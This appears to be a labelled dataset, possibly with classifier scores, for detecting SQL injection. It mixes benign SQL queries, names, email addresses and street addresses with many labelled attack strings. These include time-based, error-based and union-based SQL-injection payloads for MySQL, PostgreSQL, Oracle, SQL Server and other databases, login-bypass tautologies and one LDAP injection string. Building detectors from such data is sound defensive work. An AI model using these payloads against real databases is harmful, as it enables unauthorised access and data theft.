8.88987e+15,0,0,0.0
15124,0,0,0.004468253314358248
select * from board where    not arrow = 'mind',0,0,0.0
select min ( pig )  as pack from soil,0,0,0.0
where exists  ( select productname from   products where products.supplierid  =  suppliers.supplierid and price  =  22 ) ;,0,0,0.09
"1'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'nbsr' like 'nbsr",1,1,1.0
86m-bra,0,0,0.006527024015406931
"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,1.0
2.42593e+15,0,0,0.0
"1'   )    )    and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   'nvsy' like 'nvsy",1,1,1.0
"""*""",1,1,0.500361660863688
1'   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  'qfxg'  =  'qfxg,1,1,1.0
-7452' or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and 'nmdq' like 'nmdq,1,1,1.0
select * from nothing where milk between '1996-07-01' and '1996-07-31',0,0,0.0
 update long set list = 'choice'where fierce = 'strong',0,0,0.0
"-6924'  )   union all select 2046,2046,2046,2046,2046,2046,2046--",1,1,1.0
atiy,0,0,0.004468253314358248
"1234 ' and 1  =  0 union all select 'admin', '81dc9bdb52d04dc20036dbd8313ed055",1,1,0.7525
select * from dog where replied = 'golden' limit 3,0,0,0.0
update,1,0,0.004019149522580225
49339665l,0,0,0.004468253314358248
select * from soil where part between 'fight' and 'said',0,0,0.0
1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,1,1,1.0
"-8893%'  )   union all select 1254,1254--",1,1,1.0
"select * from dot where either between ""power"" and    ""wore""",0,0,0.13
select min ( poem )  as gave from such,0,0,0.0
"-9672'   )    )    as rupb where 8218  =  8218 or make_set  (  4954  =  1836,1836  )  --",1,1,1.0
m86uca,0,0,0.004468253314358248
simeon,0,0,0.004468253314358248
"  select greatest ( ""w3schools.com"", ""microsoft.com"", ""apple.com"" ) ;",0,0,0.0
select * from ourselves where sad = 'select' limit 3,0,0,0.07
"-7060'  )   or make_set  (  4233  =  1689,1689  )   and   (  'twpr' like 'twpr",1,1,0.99
lupien,0,0,0.004468253314358248
" select * from users where id  =  1 + @<1# union select 1,version  (    )   -- 1",1,1,1.0
bateman@alojesuweb.in,0,0,0.001423800461630333
8.32244e+15,0,0,0.0
"1%""   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--",1,1,1.0
select * from folks where activity in  ( select frozen from did ) ,0,0,0.0
1'   )    )    waitfor delay '0:0:5' and    (    (   'jcfe'  =  'jcfe,1,1,1.0
"insert into lying  ( border, vast, tune )  values  ( 'longer', 'movement', 'dirt' )  ",0,0,0.0
 (  sqlvuln  ) ,1,1,0.9800572761985574
batllori budi,0,0,0.004468253314358248
"1   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   4450  =  4450",1,1,1.0
16966742x,0,0,0.004468253314358248
1  )   and 9198  =  9198--,1,1,1.0
select top 50 percent * from limited,0,0,0.0
select * from found where not greatest = 'none'  and not or = 'dream',0,0,0.02
werling,0,0,0.004468253314358248
%2a%28%7c%28objectclass%3d%2a%29%29,1,1,0.9800939470890968
"1'+  (  select 'nzgq' where 7230  =  7230 and elt  (  1210  =  1210,sleep  (  5   )    )     )  +'",1,1,1.0
rattray@elgrancolisionadordehadrones.gl,0,0,0.004468253314358248
"-2605""  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  ""cikb"" like ""cikb",1,1,1.0
1'+  (  select 'yhcf' where 8367  =  8367,1,1,1.0
1  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  3836  =  3836,1,1,1.0
select distinct activity from tax,0,0,0.0
begin if   (  5624  =  5624  )   then dbms_lock.sleep  (  5  ) ,1,1,0.95
1'  )   union all select null--,1,1,1.0
"-5224'  )   where 1962  =  1962 union all select 1962,1962,1962,1962,1962,1962,1962,1962,1962--",1,1,1.0
-3960' or 9323  =  9323#,1,1,1.0
" select column_name ( s )  from saw,powder",0,0,0.0
"-4035' union all select 9540,9540,9540,9540,9540,9540,9540,9540,9540,9540--",1,1,1.0
quicena,0,0,0.004468253314358248
10262643c,0,0,0.004468253314358248
select about from together union select tool from opinion order by series,0,0,0.0
trixy,0,0,0.004468253314358248
select * from mainly fetch first 50 percent rows only,0,0,0.0
select * from grade  where world = beginning,0,0,0.0
select avg ( price ) from breathe,0,0,0.0
select doing ( s )  from general union all,0,0,0.0
select * from whatever where writer in  ( select noise from damage ) ,0,0,0.01
select * from smallest fetch first 50 percent rows only,0,0,0.0
"1%""   )    )    and make_set  (  9897  =  5557,5557  )   and    (    (   ""%""  =  """,1,1,1.0
"-2071 union all select 4753,4753--",1,1,1.0
select count ( * )  as reach,0,0,0.0
1' in boolean mode  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,1,1.0
standiford@elpaisaje.bg,0,0,0.004468253314358248
reco+vero,0,0,0.004468253314358248
select * from column where aloud between '1996-07-01' and '1996-07-31',0,0,0.0
"1'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'hbld'  =  'hbld",1,1,1.0
"  select * from friend where castle not in  ( 'recall', 'post', 'four' )  ",0,0,0.0
select * from nature 3,0,0,0.0
select * from birds 3,0,0,0.0
select * from peace,0,0,0.0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  ""%""  =  """,1,1,1.0
"1%""  )   union all select null,null,null,null,null,null,null,null,null,null#",1,1,1.0
select * from sheep  where window not like '[north]%',0,0,0.0
yasna,0,0,0.004468253314358248
80819303v,0,0,0.004468253314358248
"-2715'   )    )    union all select 8646,8646,8646,8646,8646,8646,8646,8646--",1,1,1.0
"-9932"" union all select 4049,4049,4049--",1,1,1.0
calle torreta 126 9c,0,0,0.0
select * from giant order by boy,0,0,0.0
"1""   )    )     )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,1,1.0
"1'  )   as hvyx where 3194  =  3194 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,1.0
select rand ( 6 ) ;,0,0,0.0
select * from lion fetch first 3 rows only,0,0,0.0
select * from rich 3,0,0,0.0
select avg ( merely ) from until select sum ( give ) ,0,0,0.0
select   (  case when   (  9562  =  5996  )   then 1 else 9562*  (  select 9562 from master..sysdatabases  )   end  )  --,1,1,1.0
select avg ( involved ) from so select sum ( deer ) ,0,0,0.0
18670,0,0,0.004468253314358248
delete from captain where clothing = 'those',0,0,0.0
1 where 5080  =  5080,1,1,1.0
46593,0,0,0.004468253314358248
" select * from cake order by dug asc, deep desc",0,0,0.0
"1""   )    )    and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""kpwc"" like ""kpwc",1,1,1.0
boes@cumbareback.kz,0,0,0.004468253314358248
madhim,0,0,0.004468253314358248
select * from total where during between 'scared' and 'faster',0,0,0.0
select   (  case when   (  9318  =  7198  )   then 9318 else 9318*  (  select 9318 from information_schema.character_sets  )   end  )  #,1,1,1.0
"  select milkid as id, at as spin from object",0,0,0.0
linas,0,0,0.004468253314358248
select count ( plateid ) from deer,0,0,0.0
select * from his fetch first 3 rows only select top 50 percent * from needle,0,0,0.0
"1' and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,1,1.0
baily,0,0,0.004468253314358248
select * from fun where due between '1996-07-01' and '1996-07-31',0,0,0.0
"calle toronja, 157",0,0,0.0
"1 where 2914  =  2914 union all select null,null,null#",1,1,0.99
select * from case order by somebody desc,0,0,0.0
" select column_name ( s )  from together,summer",0,0,0.0
select option_value from wp_options where option_name  =  '_houzez_property_label_2874' limit 1,0,0,0.0
select top 50 percent * from compound,0,0,0.0
 update cost set cat = 'discuss'where today = 'dig',0,0,0.0
1230,0,0,0.004468253314358248
"1 where 5929  =  5929 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
select * from enemy order by wealth,0,0,0.0
select shelf ( s from attached right join,0,0,0.0
select * from consider where wrote not like 'floor%',0,0,0.0
select * from more where not height = 'bite'  and not expression = 'aside',0,0,0.0
select * from molecular where    not put = 'nest',0,0,0.0
select avg ( brother ) from each select sum ( sheet ) ,0,0,0.0
select kept ( s )  from powder union all,0,0,0.0
1'  )   where 8086  =  8086 and 1430  =  7941--,1,1,1.0
"  (  select * from generate_series  (  3906,3906,case when   (  3906  =  3906  )   then 1 else 0 end  )   limit 1  )  ",1,1,0.98
select count ( distinct breathe )  from myself,0,0,0.0
-6144'  )   or 9385  =  2474--,1,1,1.0
select * from table_name ;,0,0,0.01
de78e24423n6e,0,0,0.004468253314358248
3.07402e+15,0,0,0.0
"1',  (  select   (  case when   (  9443  =  9443  )   then sleep  (  5  )   else 9443*  (  select 9443 from information_schema.character_sets  )   end   )    )   ",1,1,1.0
1 where 8095  =  8095,1,1,1.0
select count ( distinct purple )  from even,0,0,0.0
select passage from wooden,0,0,0.0
select sea ( s from consider right join,0,0,0.0
njar,0,0,0.004468253314358248
from  ( select distinct choice from event ) ,0,0,0.0
select count ( fifth )  from at,0,0,0.0
"1'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  ",1,1,1.0
select drive ( s from laid right join,0,0,0.0
delete from studied where serious = 'refer',0,0,0.0
select * from  ( select problem from exercise ) ,0,0,0.0
"calle hostieros, 24",0,0,0.0
"  select period_add ( 201703, 15 ) ;",0,0,0.0
"-2013""   )    )    as kisy where 3802  =  3802 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --",1,1,1.0
if  (  1928  =  4811  )   select 1928 else drop function ucko--,1,1,1.0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'fnna'  =  'fnna",1,1,1.0
isidro,0,0,0.004468253314358248
7633,0,0,0.004468253314358248
" select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",1,1,1.0
"-4993"" union all select 6959,6959,6959--",1,1,1.0
"pl. ingeniero torres quevedo, s/n 7?a",0,0,0.0
benajas rodrguez,0,0,0.004468253314358248
1'||  (  select 'bgdh' from dual where 1967  =  1967,1,1,1.0
"c/ gustavo adolfo becquer 91,",0,0,0.0
5.11823e+15,0,0,0.0
select option_value from wp_options where option_name  =  '_options_cell_number' limit 1,0,0,0.0
"1""   )    )    as esho where 8864  =  8864 order by 1--",1,1,1.0
"1%'   )    )    or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,1.0
9.84is22nte334c799,0,0,0.0012615091491975637
lehar,0,0,0.004468253314358248
1'+  (  select 'qylf' where 6984  =  6984 and 2255  =  5094,1,1,0.99
"-8448%"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,1,1,1.0
"  select * from behavior where fur not in  ( 'particles', 'term', 'boat' )  ",0,0,0.0
"  select orders.proverid, employees.although, employees.thin from ordersright join employees on orders.employeeid  =  employees.equipmentid order by orders.keyid",0,0,0.0
"  update kitchen set product =  'wait', city =  'favorite' where bat =  everything",0,0,0.0
1   )    )     )   rlike sleep  (  5  )  #,1,1,1.0
3.72891e+15,0,0,0.0
389,0,0,0.004468253314358248
"1%'   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,1.0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  ""ihqf""  =  ""ihqf",1,1,1.0
sojuela,0,0,0.004468253314358248
-8710 or 9323  =  9323#,1,1,1.0
select count ( respectid ) from pressure,0,0,0.0
min81t8,0,0,0.004468253314358248
select option_value from wp_options where option_name  =  '_options_footer_logo' limit 1,0,0,0.0
select excitement from lunch union all select human from ride order by leg,0,0,0.01
"1'+  (  select 'sacd' where 5984  =  5984 union all select null,null,null,null,null,null,null#",1,1,1.0
"1 and elt  (  4249  =  4249,7259  )  -- meef",1,1,1.0
1s,1,0,0.004468253314358248
pa24dan3cea,0,0,0.004468253314358248
"1""   )    )    and elt  (  3785  =  9386,9386  )   and    (    (   ""inwa"" like ""inwa",1,1,1.0
zobelda,0,0,0.004468253314358248
"1%"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and ""%""  =  """,1,1,1.0
1'  )   where 5214  =  5214,1,1,1.0
select * from afraid where rays = 'roar',0,0,0.0
select count ( worthid ) from mirror,0,0,0.0
"linares, 42",0,0,0.004468253314358248
1' where 3337  =  3337 and 8403  =  5760,1,1,0.97
select wp_posts.* from wp_posts where id in  ( 367533 ) ,0,0,0.0
delfina,0,0,0.004468253314358248
select * from scared fetch first 50 percent rows only,0,0,0.0
"select * from visitor where mistake between ""apart"" and    ""unknown""",0,0,0.0
"1%""   )    )     )   and   (  3502  =  7893  )  *7893 and    (    (     (  ""%""  =  """,1,1,1.0
"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'qyyg'  =  'qyyg",1,1,1.0
"-9505'   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'qhdg'  =  'qhdg",1,1,1.0
"   select deeply, to, perfrom improve where aloud  is not null",0,0,0.0
" select * from users where id  =  1 or @#""{  =  1 union select 1,version  (    )   -- 1",1,1,1.0
"  select orders.zerorid, employees.as, employees.fireplace from ordersright join employees on orders.employeeid  =  employees.solidid order by orders.structureid",0,0,0.0
gladiolos 30,0,0,0.00108924991411699
select curdate (  ) ;,0,0,0.0
1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  'brob'  =  'brob,1,1,1.0
select option_value from wp_options where option_name  =  'houzez_20_db_updated' limit 1,0,0,0.0
"1""   )    )    union all select null,null,null,null,null,null,null,null,null#",1,1,1.0
1  )   or sleep  (  5  ) ,1,1,0.99
"-4329'  )   union all select 1353,1353,1353,1353,1353,1353#",1,1,1.0
chinaphan@viajesdacapalla.eh,0,0,0.004468253314358248
delete from necessary,0,0,0.0
nadilla,0,0,0.004468253314358248
rillo de gallo,0,0,0.0
"-5845'   )    )     )   union all select 3595,3595,3595,3595,3595,3595,3595,3595,3595#",1,1,1.0
alg59za,0,0,0.004468253314358248
"1""   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,1,1.0
 update shells set shop = 'serious'where loss = 'process',0,0,0.0
verani@viajesdacapalla.gq,0,0,0.004468253314358248
"1"" where 8734  =  8734",1,1,1.0
1 where 1576  =  1576,1,1,1.0
"-8599   )    )    or elt  (  5628  =  2324,2324  )   and    (    (   1134  =  1134",1,1,1.0
"1""   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""cwpt"" like ""cwpt",1,1,1.0
pataki-grifties@hiteurope.by,0,0,0.10041025465689854
select * from must where protection = 'test'  or bee = 'arrive',0,0,0.0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   '%'  =  '",1,1,1.0
colvara pulve,0,0,0.004468253314358248
"1""  )   where 4849  =  4849 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1,1.0
select avg ( ants ) from nothing select sum ( human ) ,0,0,0.0
"1""  )   where 2837  =  2837 and   (  3020  =  3020  )  *6703--",1,1,1.0
"1'||  (  select 'kbvq' where 9279  =  9279 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )     )  ||'",1,1,1.0
"1'||  (  select 'mdqc' where 4533  =  4533 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1.0
1'  )   as bihs where 4197  =  4197,1,1,1.0
1  )   as eryo where 2531  =  2531 rlike sleep  (  5  )  --,1,1,1.0
select * from heat 3 select * from whenever,0,0,0.0
" select orders.orderid, customers.customername, orders.orderdate from orders inner join customers on orders.customerid = customers.customerid;",0,0,0.0
select * from customers  where country = 'germany'  and  ( city = 'berlin' or city = 'münchen' ) ;,0,0,0.18
griffith_chesbro@psykoterapeut.sn,0,0,0.003983800240513096
le-van-kim@la-sexta-f1.ro,0,0,0.08110411166935128
"   select simple, let+ ', ' + occasionally+ ' ' + break+ ', ' + shelf as customs  from ship",0,0,0.0
"1  )   where 6082  =  6082 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1,1,1.0
63545647m,0,0,0.004468253314358248
select * from products; /*select all the columns of all the records in the customers table:*/,0,0,0.14
mattos@velazquezlarraaga.dd,0,0,0.004468253314358248
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",1,1,1.0
"1%""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""%""  =  """,1,1,1.0
"1',  (  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4932  =  4932  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ",1,1,1.0
select top 3 * from tobacco,0,0,0.0
1'||  (  select 'vpuh' where 8164  =  8164,1,1,1.0
"   select passage, mine+ ', ' + tiny+ ' ' + mail+ ', ' + character as capital  from importance",0,0,0.0
select count ( * )  as women,0,0,0.0
yern,0,0,0.004468253314358248
"1%'   )    )    union all select null,null,null,null,null,null,null,null,null--",1,1,1.0
steele,0,0,0.004468253314358248
"   select pick, current+ ', ' + compare+ ' ' + screen+ ', ' + smallest as pride  from child",0,0,0.0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  ""mkal"" like ""mkal",1,1,1.0
1  )   where 5651  =  5651,1,1,1.0
select * from beginning,0,0,0.0
-9456%'   )    )     )   order by 1#,1,1,1.0
" select * from users where id  =  '1' *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1'",1,1,1.0
"-2912""  )   as eizh where 2223  =  2223 or make_set  (  1041  =  3056,3056  )  --",1,1,1.0
"-7125"" or   (  8919  =  2275  )  *2275 and ""fbwo""  =  ""fbwo",1,1,0.98
select top 50 percent * from chamber select * from land fetch first 50 percent rows onlyselect top 3 * from triangle,0,0,0.0
select * from salmon where act = 'glad',0,0,0.0
2293,0,0,0.004468253314358248
"1"" where 7158  =  7158",1,1,0.9200422119037569
"calle puruuela, 15 6?d",0,0,0.0
select min ( held )  as gentle from fifty,0,0,0.0
"1,  (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select 1 from generate_series  (  8979,8979,case when   (  8979  =  8979  )   then 1 else 0 end  )   limit 1  )  ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    )   ",1,1,1.0
"select 'supplier', contactname, city, country from suppliers;",0,0,0.09
select eleven ( s ) from these inner join,0,0,0.0
select top 50 percent * from anything,0,0,0.0
"insert into south ( second, distant, exclaimed, exactly, wealth, sure )  values  ( 'factor', 'bus'. arrive', 'lucky', 'on', 'nails', 'column' )  ",0,0,0.0
1' where 7910  =  7910,1,1,1.0
select * from tribe order by hunt,0,0,0.0
" select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",1,1,1.0
select avg ( trip )  from relationship  select sum ( wild ) ,0,0,0.0
laparra pinazo,0,0,0.004468253314358248
"-8043%""   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  ""%""  =  """,1,1,1.0
rosa,0,0,0.004468253314358248
"-2430'  )   union all select 5712,5712,5712,5712,5712,5712,5712,5712,5712,5712--",1,1,1.0
alcojor larenas,0,0,0.004468253314358248
3471,0,0,0.004468253314358248
"1'||  (  select 'qwoo' from dual where 8802  =  8802 or elt  (  6272  =  6272,sleep  (  5   )    )     )  ||'",1,1,1.0
admin' or '1'  =  '1,1,1,0.97
"1%' union all select null,null,null--",1,1,1.0
"1' in boolean mode  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  #",1,1,1.0
9.16233e+15,0,0,0.0
"select count  (  *  )   from generate_series  (  1,5000000  )   and ""ihbe"" like ""ihbe",1,1,0.95
delete from nearest,0,0,0.0
select count ( problemid ) from pound,0,0,0.0
select * from experiment where foot like '%store%',0,0,0.0
firestone@artforall.ag,0,0,0.004468253314358248
select * from spend,0,0,0.0
"1'+  (  select hspl where 4530  =  4530 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,1,1.0
seyler@miami-beach.gw,0,0,0.006527024015406931
14100,0,0,0.004468253314358248
select knowledge ( s )  from longer select create ( s ) ,0,0,0.01
select   (  case when   (  9667  =  6212  )   then 9667 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,1,1.0
select * from origin order by winter desc,0,0,0.0
admin' or 1  =  1--,1,1,1.0
" select concat ( address, "" "", postalcode, "" "", city )  as address from  customers;",0,0,0.09002496359475763
select * from tin where before between general09/01/1996poor and practice15/31/1996that,0,0,0.0
velov@expozaragozafloral2014.ac,0,0,0.004468253314358248
" select * from happy order by power, promised",0,0,0.0
"-9382'  )   union all select 4774,4774,4774,4774--",1,1,1.0
select * from previous where climb like '%tube%',0,0,0.0
select min ( spirit )  as plastic from expect,0,0,0.0
"calle belen 10, 8a",0,0,0.0
" select * from users where id  =  '1' +   (  \  )   union select 1,@@version -- 1'",1,1,1.0
select * from road fetch first 3 rows only,0,0,0.0
"1'  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,1,1.0
"1""   )    )    rlike sleep  (  5  )   and    (    (   ""ahhx"" like ""ahhx",1,1,1.0
rasmia,0,0,0.004468253314358248
9362,0,0,0.004468253314358248
"calle bir ganduz, 90",0,0,0.0
select * from paint where century between 'change' and 'selection',0,0,0.0
select count ( team )  from expect,0,0,0.0
"1   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   8554  =  8554",1,1,1.0
select height from chart union all select parallel from principle order by tax,0,0,0.0
1%' or sleep  (  5  )   and '%'  =  ',1,1,0.99
select * from buy where vapor  between 10 and 20,0,0,0.0
nada,0,0,0.004468253314358248
695,0,0,0.004468253314358248
"1%""   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,1.0
galce,0,0,0.004468253314358248
1'  )   and 7533  =  7533,1,1,0.99
"1'   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'pqxe' like 'pqxe",1,1,1.0
"1%'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  '%'  =  '",1,1,1.0
4.26048e+15,0,0,0.0
"-6667%""   )    )    union all select 7348,7348,7348,7348,7348,7348,7348,7348#",1,1,1.0
"insert into account  ( metal, dozen, courage )  values  ( 'now', 'explanation', 'plural' )  ",0,0,0.0
"insert into cool  ( mile, thank, leaf )  values  ( 'row', 'tribe', 'rope' )  ",0,0,0.03
 and 1  =  0  )   union all,1,1,0.7925
"   select count ( drove ) , divide from soap by box",0,0,0.0
fogars de la selva,0,0,0.0
"-7808""   )    )    as jgkk where 9230  =  9230 or elt  (  1032  =  1032,3623  )  --",1,1,1.0
"1'  )   as rqfq where 7077  =  7077 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,1,1.0
"   select unless, applied, expressfrom know where slow  is not null",0,0,0.0
jaworsky,0,0,0.004468253314358248
-6203'   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'luee'  =  'luee,1,1,1.0
select shelf ( s )  from kill,0,0,0.0
discoro,0,0,0.004468253314358248
select min ( jet )  as money from transportation,0,0,0.0
select * from town where industrial = 'under'  and city = 'mill',0,0,0.0
select top 3 * from heavy select * from slept 3select * from pleasant,0,0,0.0
dalleto poroma,0,0,0.004468253314358248
select count ( swam ) from this,0,0,0.0
"-6942'  )   union all select 7280,7280,7280#",1,1,1.0
"-4838'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,1,1.0
" select * from missing order by string, along",0,0,0.0
select account from come union all select expect from like order by barn,0,0,0.03
"select * from tired where strong between ""keep"" and    ""difficult""",0,0,0.0
limitable,0,0,0.004468253314358248
"1'  )   where 1323  =  1323 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1,1,1.0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   'bhlx' like 'bhlx",1,1,1.0
"1%""   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""%""  =  """,1,1,1.0
hermine@943.mw,0,0,0.004468253314358248
coursdev,0,0,0.004468253314358248
boquieni,0,0,0.004468253314358248
"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  ",1,1,1.0
16856,0,0,0.004468253314358248
"   select pattern,fair,sand,discovery,tool     (  (  park join natural on burn.corner =  piece.temperature )   inner join deadon orders.describe =  hold.everyid ) ",0,0,0.0
select * from those where pine in  ( select passage from verb ) ,0,0,0.0
